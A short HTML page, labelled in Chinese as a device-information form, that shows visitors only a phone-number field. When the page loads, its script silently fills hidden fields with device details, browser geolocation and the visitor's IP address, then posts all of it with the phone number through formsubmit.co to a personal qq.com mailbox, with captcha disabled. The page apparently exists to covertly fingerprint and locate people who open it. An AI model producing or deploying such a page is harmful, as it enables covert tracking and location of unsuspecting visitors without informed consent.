<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>设备信息收集</title>
    <style>
        /* 样式同上个示例保持统一 */
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 20px auto; padding: 20px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; }
        input, textarea { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        button { background-color: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>设备信息提交</h2>
    <form action="https://formsubmit.co/3674295723@qq.com" method="POST" id="myForm">
        <input type="hidden" name="_next" value="https://yourdomain.com/thanks.html">
        <input type="hidden" name="_captcha" value="false">
        <input type="text" name="_honey" style="display: none;">

        <!-- 自动收集的隐藏字段 -->
        <input type="hidden" name="device_info" id="deviceInfo">
        <input type="hidden" name="location" id="geoLocation">
        <input type="hidden" name="ip_address" id="ipAddress">

        <!-- 用户手动输入 -->
        <div class="form-group">
            <label for="phone">手机号码：</label>
            <input type="tel" id="phone" name="phone" pattern="[0-9]{11}" required>
        </div>

        <button type="submit">提交信息</button>
    </form>

    <script>
        // 自动收集设备信息
        const collectDeviceInfo = () => {
            const deviceData = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                cookies: navigator.cookieEnabled ? '启用' : '禁用',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                battery: navigator.getBattery ? '支持' : '不支持'
            };
            document.getElementById('deviceInfo').value = JSON.stringify(deviceData);
        }

        // 获取地理位置（需要用户授权）
        const getLocation = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const geoData = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    document.getElementById('geoLocation').value = JSON.stringify(geoData);
                }, error => {
                    document.getElementById('geoLocation').value = '用户拒绝授权';
                });
            }
        }

        // 获取IP地址（通过第三方API）
        const getIP = async () => {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                document.getElementById('ipAddress').value = data.ip;
            } catch (error) {
                document.getElementById('ipAddress').value = '获取失败';
            }
        }

        // 页面加载时自动执行
        window.addEventListener('load', () => {
            collectDeviceInfo();
            getLocation();
            getIP();
        });
    </script>
</body>
</html>
